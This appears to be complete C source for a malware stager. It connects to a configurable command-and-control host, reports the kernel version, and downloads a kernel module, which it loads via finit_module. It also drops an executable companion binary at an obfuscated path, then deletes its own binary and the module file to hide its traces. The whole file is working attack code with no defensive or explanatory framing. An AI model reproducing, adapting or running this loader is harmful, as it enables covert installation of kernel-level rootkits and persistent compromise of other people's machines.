#define _GNU_SOURCE

#include <arpa/inet.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <unistd.h>

#include "obfs.h"

/**
 * @param C2_HOST 
 * @param C2_PORT 
 */

#ifndef C2_HOST
# define C2_HOST "127.0.0.1"
#endif
#ifndef C2_PORT
# define C2_PORT 4444
#endif

#define KO_MAX_SIZE (8u * 1024u * 1024u)

static int recv_exact(int fd, void *buf, uint32_t n)
{
    uint8_t  *p    = (uint8_t *)buf;
    uint32_t  done = 0;

    while (done < n) {
        ssize_t r = recv(fd, p + done, n - done, 0);
        if (r <= 0)
            return -1;
        done += (uint32_t)r;
    }
    return 0;
}

static int send_exact(int fd, const void *buf, uint32_t n)
{
    const uint8_t *p    = (const uint8_t *)buf;
    uint32_t       done = 0;

    while (done < n) {
        ssize_t s = send(fd, p + done, n - done, 0);
        if (s <= 0)
            return -1;
        done += (uint32_t)s;
    }
    return 0;
}

int main(int argc, char *argv[])
{
    struct utsname     u;
    struct sockaddr_in addr;
    int                sock   = -1;
    int                tmp_fd = -1;
    uint8_t           *ko_buf = NULL;
    uint32_t           len;
    uint32_t           ko_size;
    int                ret    = 1;

    (void)argc;

    if (uname(&u) != 0)
        goto out;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
        goto out;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(C2_PORT);
    if (inet_pton(AF_INET, C2_HOST, &addr.sin_addr) != 1)
        goto out;

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0)
        goto out;

    len = (uint32_t)strlen(u.release);
    if (send_exact(sock, &len, sizeof(len)) != 0)
        goto out;
    if (send_exact(sock, u.release, len) != 0)
        goto out;

    /* --- receive .ko --- */
    if (recv_exact(sock, &ko_size, sizeof(ko_size)) != 0)
        goto out;
    if (ko_size == 0 || ko_size > KO_MAX_SIZE)
        goto out;

    ko_buf = malloc(ko_size);
    if (!ko_buf)
        goto out;
    if (recv_exact(sock, ko_buf, ko_size) != 0)
        goto out;

    /* write .ko to tmpfs */
    DEOBFS(tmp_path, _enc_tmp_ko, _LEN_TMP_KO);
    tmp_fd = open(tmp_path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (tmp_fd < 0)
        goto out;
    if (write(tmp_fd, ko_buf, ko_size) != (ssize_t)ko_size)
        goto out;
    close(tmp_fd);
    tmp_fd = -1;
    free(ko_buf);
    ko_buf = NULL;

    /* load .ko */
    tmp_fd = open(tmp_path, O_RDONLY | O_CLOEXEC);
    if (tmp_fd < 0)
        goto out;
    syscall(SYS_finit_module, tmp_fd, "", 0); /* ignore EEXIST */
    close(tmp_fd);
    tmp_fd = -1;

    /* --- receive companion binary --- */
    {
        uint32_t comp_size;
        uint8_t *comp_buf;

        if (recv_exact(sock, &comp_size, sizeof(comp_size)) != 0)
            goto out;
        if (comp_size == 0 || comp_size > KO_MAX_SIZE)
            goto out;

        comp_buf = malloc(comp_size);
        if (!comp_buf)
            goto out;
        if (recv_exact(sock, comp_buf, comp_size) != 0) {
            free(comp_buf);
            goto out;
        }

        DEOBFS(comp_path, _enc_comp_path, _LEN_COMP_PATH);
        tmp_fd = open(comp_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
        if (tmp_fd >= 0) {
            write(tmp_fd, comp_buf, comp_size);
            fchmod(tmp_fd, 0755);
            close(tmp_fd);
            tmp_fd = -1;
        }
        free(comp_buf);
    }

    ret = 0;

out:
    if (tmp_fd >= 0)
        close(tmp_fd);
    if (sock >= 0)
        close(sock);
    free(ko_buf);

    {
        DEOBFS(tmp_path2, _enc_tmp_ko, _LEN_TMP_KO);
        unlink(tmp_path2);
    }

    if (ret == 0)
        unlink(argv[0]);

    return ret;
}
